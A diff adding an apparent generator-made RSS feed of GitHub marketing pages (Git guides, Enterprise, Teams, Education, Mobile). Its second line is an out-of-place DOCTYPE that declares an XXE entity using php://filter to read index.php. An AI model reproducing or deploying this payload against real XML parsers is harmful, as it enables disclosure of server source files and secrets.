@@ -1,0 +1,124 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" >]>
+<?xml-stylesheet type="text/xsl" href="https://cdn.mysitemapgenerator.com/api/feedpreview_s.01.xsl"?>
+		<!--	created with www.mysitemapgenerator.com	-->
+<rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:media="http://search.yahoo.com/mrss/">
+	<channel>
+		<title>github.com</title>
+		<link><![CDATA[https://github.com]]></link>
+		<description>GitHub is where people build software. More than 100 million people use GitHub to discover, fork, and contribute to over 420 million projects.</description>
+		<language>en</language>
+		<pubDate>Sat, 23 Nov 2024 20:59:18 +0000</pubDate>
+		<generator>MySitemapGenerator (www.mysitemapgenerator.com)</generator>
+
+		<item>
+			<guid isPermaLink="false">805420202</guid>
+			<title>git Guides</title>
+			<link>https://github.com/git-guides</link>
+			<author>Администратор</author>
+			<category>Новости сайта</category>
+			<description>Learn git.</description>
+			<content:encoded><![CDATA[<p>If you're wondering where Git ends and GitHub begins, you're not alone. They are tied closely together to make working with them both a seamless experience. While Git takes care of the underlying version control, GitHub is the collaboration platform built on top of it. GitHub is the place for pull requests, comments, reviews, integrated tests, and so much more. Most developers work locally to develop and use GitHub for collaboration. That ranges from using GitHub to host the shared remote repository to working with colleagues and capitalizing on features like protected branches, code review, GitHub Actions, and more.</p><p>The best place to practice using Git and GitHub is the <a href="https://lab.github.com/githubtraining/introduction-to-github">Introduction to GitHub Learning Lab course</a>.</p><p>If you already know Git and need to sign up for a GitHub account, head over to <a href="https://github.com/">github.com</a>.</p><p><a href="https://github.com/github/training-kit/blob/master/git-guides/git-overview.md">Contribute to this article</a> on GitHub.</p><h3>Get started with git and GitHub</h3><p>Review code, manage projects, and build software alongside 40 million developers.</p><h2>Site-wide Links</h2><a href="https://github.com/"></a> <h3>Subscribe to our developer newsletter</h3><p>Get tips, technical guides, and best practices. Twice a month. Right in your inbox.</p><a href="https://resources.github.com/newsletter/">Subscribe</a> <h3>Product</h3><p>2024 GitHub, Inc.</p>]]></content:encoded>
+			<pubDate>Sat, 23 Nov 2024 22:59:17 +0200</pubDate>
+			<enclosure url="https://github.githubassets.com/assets/git-guides-d75bee09e324.png" type="image/png" length="0" />
+		</item>
+		<item>
+			<guid isPermaLink="false">2412507151</guid>
+			<title>The AI Powered Developer Platform.</title>
+			<link>https://github.com/enterprise</link>
+			<author>Администратор</author>
+			<category>Новости сайта</category>
+			<description>Whether you’re working solo or leading an enterprise, GitHub has everything you need to build and scale your team’s workflow. Choose the plan that’s right for your hosting environment and security ...</description>
+			<content:encoded><![CDATA[<p>To build, scale, and deliver secure software.</p><p><img src="https://github.com/images/modules/site/enterprise/2023/hero-visual.png"></p><h2>Featured sponsors</h2><p><img src="https://github.com/images/modules/site/enterprise/2023/logos/logo-stripe.svg"></p><p><img src="https://github.com/images/modules/site/enterprise/2023/logos/logo-twilio.svg"></p><p><img src="https://github.com/images/modules/site/enterprise/2023/logos/logo-spotify.svg"></p><p><img src="https://github.com/images/modules/site/enterprise/2023/logos/logo-arduino.svg"></p><p><img src="https://github.com/images/modules/site/enterprise/2023/logos/logo-ford.svg"></p><p><img src="https://github.com/images/modules/site/enterprise/2023/logos/logo-3m.svg"></p><p><img src="https://github.com/images/modules/site/enterprise/2023/logos/logo-pg.svg"></p><p><img src="https://github.com/images/modules/site/enterprise/2023/logos/logo-aa.svg"></p><p><img src="https://github.com/images/modules/site/enterprise/2023/logos/logo-nationwide.svg"></p><p><img src="https://github.com/images/modules/site/enterprise/2023/logos/logo-kpmg.svg"></p><p><img src="https://github.com/images/modules/site/enterprise/2023/logos/logo-stripe.svg"></p><p><img src="https://github.com/images/modules/site/enterprise/2023/logos/logo-twilio.svg"></p><p><img src="https://github.com/images/modules/site/enterprise/2023/logos/logo-spotify.svg"></p><p><img src="https://github.com/images/modules/site/enterprise/2023/logos/logo-arduino.svg"></p><p><img src="https://github.com/images/modules/site/enterprise/2023/logos/logo-ford.svg"></p><p><img src="https://github.com/images/modules/site/enterprise/2023/logos/logo-3m.svg"></p><p><img src="https://github.com/images/modules/site/enterprise/2023/logos/logo-pg.svg"></p><p><img src="https://github.com/images/modules/site/enterprise/2023/logos/logo-aa.svg"></p><p><img src="https://github.com/images/modules/site/enterprise/2023/logos/logo-nationwide.svg"></p><p><img src="https://github.com/images/modules/site/enterprise/2023/logos/logo-kpmg.svg"></p>Scale <h2>The enterprise-ready platform that developers know and love</h2><h3>Consolidate DevSecOps processes and enable unparalleled collaboration.</h3><h3>Leverage the industry’s most flexible secure development platform.</h3><p><a href="https://github.com/marketplace"><img src="https://github.com/images/modules/site/enterprise/2023/platform.png"></a></p><h3>Unlocking innovation at scale with AI-driven software development.</h3><p><a href="https://docs.github.com/copilot/github-copilot-chat/about-github-copilot-chat#about-github-copilot-chat"><img src="https://github.com/images/modules/site/enterprise/2023/ai.png"></a></p><p>We’ve used GitHub from the inception of Datadog. It’s a high-quality product, and a lot of our engineers contribute to open source so there’s a sense of community there. GitHub is ingrained in the DNA of our engineering, it’s become part of the culture.”</p><p><img src="https://github.com/images/modules/site/enterprise/2023/avatar-emilio.png"></p><p><img src="https://github.com/images/modules/site/enterprise/2023/element-1.png"></p><p><img src="https://github.com/images/modules/site/enterprise/2023/element-2.png"></p>AI <h2>Build, secure, and ship software faster</h2><h3>Push what's possible with GitHub Copilot, the world's most trusted and widely adopted AI developer tool.</h3><a href="https://github.com/features/copilot">Learn more about Copilot</a><h3>88%</h3><p>of developers experience increased productivity. <a href="https://github.com/">1</a></p><p><img src="https://github.com/images/modules/site/enterprise/2023/copilot-icon.png"></p>]]></content:encoded>
+			<pubDate>Sat, 23 Nov 2024 22:59:16 +0200</pubDate>
+			<enclosure url="https://github.githubassets.com/assets/enterprise-2023-46bb4a6edc4c.png" type="image/png" length="0" />
+		</item>
+		<item>
+			<guid isPermaLink="false">3319165101</guid>
+			<title>GitHub for teams Build like the best teams on the planet</title>
+			<link>https://github.com/team</link>
+			<author>Администратор</author>
+			<category>Новости сайта</category>
+			<description>With CI/CD, Dependabot, and the world’s largest developer community, GitHub gives your team everything they need to ship better software faster.</description>
+			<content:encoded><![CDATA[<h2>Build like the best teams on the planet</h2><p>With CI/CD, Dependabot, and the world’s largest developer community, GitHub gives your team everything they need to ship better software faster.</p><p><img src="https://github.githubassets.com/assets/califa-1ed7dddbe5d0.jpg"></p><p><img src="https://github.githubassets.com/assets/ohjoycelau-ffc18e400d35.jpg"></p><p><img src="https://github.githubassets.com/assets/lerebear-9bbe80165605.jpg"></p><p><img src="https://github.githubassets.com/assets/teenage-witch-12c6ca8df12f.jpg"></p><p><img src="https://github.githubassets.com/assets/broccolini-617b23298f88.jpg"></p><p><img src="https://github.githubassets.com/assets/benbalter-bcd77755ea5c.jpg"></p><p><img src="https://github.githubassets.com/assets/dialogue-califa-398a5d8ed341.png"></p><p><img src="https://github.githubassets.com/assets/dialogue-teenage-witch-c100d21398a2.png"></p><p><img src="https://github.githubassets.com/assets/dialogue-broccolini-53bcb3c38a9d.png"></p><p><img src="https://github.githubassets.com/assets/team-hero-artwork--mobile-1c8ea610c17d.png"></p><h2>Compare Plans</h2><p>team started?</p>]]></content:encoded>
+			<pubDate>Sat, 23 Nov 2024 22:59:15 +0200</pubDate>
+			<enclosure url="https://github.githubassets.com/assets/github-for-teams-534e938e1667.png" type="image/png" length="0" />
+		</item>
+		<item>
+			<guid isPermaLink="false">2985016745</guid>
+			<title>The ReadME Project</title>
+			<link>https://github.com/readme</link>
+			<author>Администратор</author>
+			<category>Новости сайта</category>
+			<description>The ReadME Project amplifies the voices of the open source community: the maintainers, developers, and teams whose contributions move the world forward every day.</description>
+			<content:encoded><![CDATA[<p><img src="//images.ctfassets.net/s5uo95nf6njh/2aJ5GA3J4vBXLb79ZAst2H/a09e72619ddca5e194a55f729314dd24/AccessibilityIllustration.jpg?w=1200&fm=jpg"></p><h2>Featured stories</h2><a href="https://github.com/readme/featured/nvda-coding-accessibility-software-blind"><h3>Coding accessibility: Software by the blind, for the blind</h3></a><p><img src="//images.ctfassets.net/s5uo95nf6njh/9MBUXeNZV29Ix5IfPQ8rN/7f173d6cd8b536e9cba79bf8343a5cd1/Hero_art.jpg?w=360&fm=jpg"></p><a href="https://github.com/readme/featured/disability-creativity"><h3>Coding accessibility: Disability as catalyst for creativity</h3></a><p>Faced with accessibility barriers, developer Paul Chiou turns obstacles into innovative solutions.</p><p><img src="//images.ctfassets.net/s5uo95nf6njh/5OJIIppZBMucnpzjPXS9FG/c7f88b0e848503c0db0225bdd0b7694d/Annalu-135_Headshot__1_.jpg?w=360&fm=jpg"></p><a href="https://github.com/readme/stories/annalu-waller"><h3>Champion accessibility to unleash untapped potential</h3></a><p>Dr. Annalu Waller on the intricate, interdependent network of support that shapes our lives.</p><p><img src="//images.ctfassets.net/s5uo95nf6njh/4mhPoQw1uGpqGG9YKy4jvH/7c1b96669654c4b324493bff9b9258db/ReadME_Project_Coding_Accessibility.jpg?w=360&fm=jpg"></p>]]></content:encoded>
+			<pubDate>Sat, 23 Nov 2024 22:59:14 +0200</pubDate>
+			<enclosure url="https://github.githubassets.com/assets/readme-project-1b8ad1b2a413.jpg" type="image/jpeg" length="0" />
+		</item>
+		<item>
+			<guid isPermaLink="false">3024381340</guid>
+			<title>Pricing Plans for every developer</title>
+			<link>https://github.com/pricing</link>
+			<author>Администратор</author>
+			<category>Новости сайта</category>
+			<description>Whether you're starting an open source project or choosing new tools for your team, we’ve got you covered.</description>
+			<content:encoded><![CDATA[<h1>Provide feedback</h1><p>We read every piece of feedback, and take your input very seriously.</p>]]></content:encoded>
+			<pubDate>Sat, 23 Nov 2024 22:59:13 +0200</pubDate>
+			<enclosure url="https://github.githubassets.com/assets/pricing-1d2e2fb4b121.png" type="image/png" length="0" />
+		</item>
+		<item>
+			<guid isPermaLink="false">4006406649</guid>
+			<title>GitHub Features</title>
+			<link>https://github.com/features</link>
+			<author>Администратор</author>
+			<category>Новости сайта</category>
+			<description>Get the right tools for the job. Automate your CI/CD and DevOps workflow with GitHub Actions, build securely, manage teams and projects, and review code in one place.</description>
+			<content:encoded><![CDATA[<h1>Provide feedback</h1><p>We read every piece of feedback, and take your input very seriously.</p>]]></content:encoded>
+			<pubDate>Sat, 23 Nov 2024 22:59:12 +0200</pubDate>
+			<enclosure url="https://github.githubassets.com/assets/features-launchpad-6c57787ff41d.png" type="image/png" length="0" />
+		</item>
+		<item>
+			<guid isPermaLink="false">3272469134</guid>
+			<title>GitHub Security</title>
+			<link>https://github.com/security</link>
+			<author>Администратор</author>
+			<category>Новости сайта</category>
+			<description>Trusted by millions of developers. We protect and defend the most trustworthy platform for developers everywhere to create and build software.</description>
+			<content:encoded><![CDATA[<h1>Provide feedback</h1><p>We read every piece of feedback, and take your input very seriously.</p>]]></content:encoded>
+			<pubDate>Sat, 23 Nov 2024 22:59:11 +0200</pubDate>
+			<enclosure url="https://images.ctfassets.net/8aevphvgewt8/4nYCIob8iGXYymoxfYfIXd/762f685334467108ef1bd6713cdc6e04/7d218003bd05a94b554b5064bc8a01087bf2fdf3b44fbb8cfab067b8243fb668-1200x630.png" type="image/png" length="0" />
+		</item>
+		<item>
+			<guid isPermaLink="false">2728534285</guid>
+			<title>Build software better, together</title>
+			<link>https://github.com/signup?ref_cta=Sign+up&amp;ref_loc=header+logged+out&amp;ref_page=/&amp;source=header-home</link>
+			<author>Администратор</author>
+			<category>Новости сайта</category>
+			<description>GitHub is where people build software. More than 100 million people use GitHub to discover, fork, and contribute to over 420 million projects.</description>
+			<content:encoded><![CDATA[<p>GitHub requires JavaScript enabled to sign up for our captcha. Please enable JavaScript.</p>]]></content:encoded>
+			<pubDate>Sat, 23 Nov 2024 22:59:10 +0200</pubDate>
+			<enclosure url="https://github.githubassets.com/assets/github-logo-55c5b9a1fe52.png" type="image/png" length="0" />
+		</item>
+		<item>
+			<guid isPermaLink="false">192717093</guid>
+			<title>What is GitHub Education?</title>
+			<link>https://github.com/education</link>
+			<author>Администратор</author>
+			<category>Новости сайта</category>
+			<description>GitHub is where people build software. More than 100 million people use GitHub to discover, fork, and contribute to over 420 million projects.</description>
+			<content:encoded><![CDATA[<p>GitHub Education is a community dedicated to empowering the next generation of developers through the power of open-source education. Whether you're a student eager to make your mark, an educator aiming to inspire, or an early career developer looking to sharpen your skills, GitHub Education is here to help you succeed.</p><p>Why Join GitHub Education?</p><p>Free access to tools : Jump-start your development journey with the GitHub Student Developer Pack, offering dozens of premium tools and services at no cost. From GitHub Copilot’s AI-powered coding assistance to GitHub Codespaces, which provide a fully configured cloud development environment, these tools are used daily by professional developers globally. They’d normally cost a fortune, but are available for free to verified students.</p><p>Real-world experience : Engage in open source projects and collaborative development to gain practical experience and build a portfolio of contributions. This hands-on approach prepares you for a successful career in tech, offering real-world application and visibility.</p><p>Exclusive learning content : Explore our Learning Paths to find structured educational content designed to guide your learning. These paths provide a clear progression through different tech topics, helping you enhance your knowledge and skills at your own pace.</p><p>Global network : Connect campus advisors and experts, and attend special events and live streams. Each connection will expand your horizon and open doors to new growth opportunities.</p><p><a href="https://education.github.com/discount_requests/application">Sign up for free</a> and take the first step toward becoming a leader in technology and innovation.</p><p>How do I join the GitHub Education?</p><p>As a student : If you're currently enrolled at an accredited educational institution, you can apply to become part of GitHub Education. You'll need to provide a school-issued email address or other documents proving your enrollment. Apply through the GitHub Education website, select 'Student', and follow the instructions to submit your information.</p><p>As a teacher : Educators can join by verifying their teacher status with a school-issued email and documentation of school affiliation. Head over to the GitHub Education site, choose 'Teacher' under the benefits section, and submit your application.</p><p>As a school : To get your school on board with the free GitHub Education program for schools, you need to be an educational institution offering degrees or certificates. The application should be completed by someone in charge of IT or a department head. Apply through the GitHub Education website, select 'Schools', and follow the instructions to submit your information.</p><p>As a partner : To begin a collaboration with GitHub Education, visit our partners page to learn more about the details and types of partnership we aim for, then, complete our partnerships form for our team to reach out and discuss the next steps.</p><p>GitHub Education is a community dedicated to empowering the next generation of developers through the power of open-source education. Whether you're a student eager to make your mark, an educator aiming to inspire, or an early career developer looking to sharpen your skills, GitHub Education is here to help you succeed.</p><p>Why Join GitHub Education?</p><p>Free access to tools : Jump-start your development journey with the GitHub Student Developer Pack, offering dozens of premium tools and services at no cost. From GitHub Copilot’s AI-powered coding assistance to GitHub Codespaces, which provide a fully configured cloud development environment, these tools are used daily by professional developers globally. They’d normally cost a fortune, but are available for free to verified students.</p><p>Real-world experience : Engage in open source projects and collaborative development to gain practical experience and build a portfolio of contributions. This hands-on approach prepares you for a successful career in tech, offering real-world application and visibility.</p><p>Exclusive learning content : Explore our Learning Paths to find structured educational content designed to guide your learning. These paths provide a clear progression through different tech topics, helping you enhance your knowledge and skills at your own pace.</p><p>Global network : Connect campus advisors and experts, and attend special events and live streams. Each connection will expand your horizon and open doors to new growth opportunities.</p><p><a href="https://education.github.com/discount_requests/application">Sign up for free</a> and take the first step toward becoming a leader in technology and innovation.</p><p>As a student : If you're currently enrolled at an accredited educational institution, you can apply to become part of GitHub Education. You'll need to provide a school-issued email address or other documents proving your enrollment. Apply through the GitHub Education website, select 'Student', and follow the instructions to submit your information.</p><p>As a teacher : Educators can join by verifying their teacher status with a school-issued email and documentation of school affiliation. Head over to the GitHub Education site, choose 'Teacher' under the benefits section, and submit your application.</p><p>As a school : To get your school on board with the free GitHub Education program for schools, you need to be an educational institution offering degrees or certificates. The application should be completed by someone in charge of IT or a department head. Apply through the GitHub Education website, select 'Schools', and follow the instructions to submit your information.</p><p>As a partner : To begin a collaboration with GitHub Education, visit our partners page to learn more about the details and types of partnership we aim for, then, complete our partnerships form for our team to reach out and discuss the next steps.</p>]]></content:encoded>
+			<pubDate>Sat, 23 Nov 2024 22:59:09 +0200</pubDate>
+		</item>
+		<item>
+			<guid isPermaLink="false">3905810433</guid>
+			<title>GitHub Mobile</title>
+			<link>https://github.com/mobile</link>
+			<author>Администратор</author>
+			<category>Новости сайта</category>
+			<description>Bring GitHub collaboration tools to your small screens with GitHub Mobile. Sign up for the iOS beta or get on the list for our Android version—and we’ll let you know when your app of choice is ready.</description>
+			<content:encoded><![CDATA[<h1>Provide feedback</h1><p>We read every piece of feedback, and take your input very seriously.</p>]]></content:encoded>
+			<pubDate>Sat, 23 Nov 2024 22:59:08 +0200</pubDate>
+			<enclosure url="https://images.ctfassets.net/8aevphvgewt8/3hk3oKfnJo9cxwiinHNOs2/002431f5bccac1c090ac1aed25b3fb95/github-mobile-84adab2b9de1.png" type="image/png" length="0" />
+		</item>
+	</channel>
+</rss>
